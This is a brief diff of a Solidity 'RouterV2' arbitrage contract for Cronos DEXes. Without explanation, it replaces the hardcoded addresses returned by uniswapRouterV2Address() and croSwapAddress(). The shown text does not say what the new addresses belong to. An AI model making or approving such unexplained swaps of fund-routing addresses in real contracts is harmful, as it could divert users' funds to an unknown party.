@@ -111,7 +111,7 @@ interface croDexSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
+        return 0x4a6EAe04632601a441D7E60bc05F99CEE0aFe8bb;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -142,7 +142,7 @@ contract RouterV2 {
     }
 
     function croSwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+        return 0x32D8314ffB32E804Cb502EE3DFDe459874a3C874;
     }
 
     function callArbitrageCroDex(address add0, address add1) public pure {
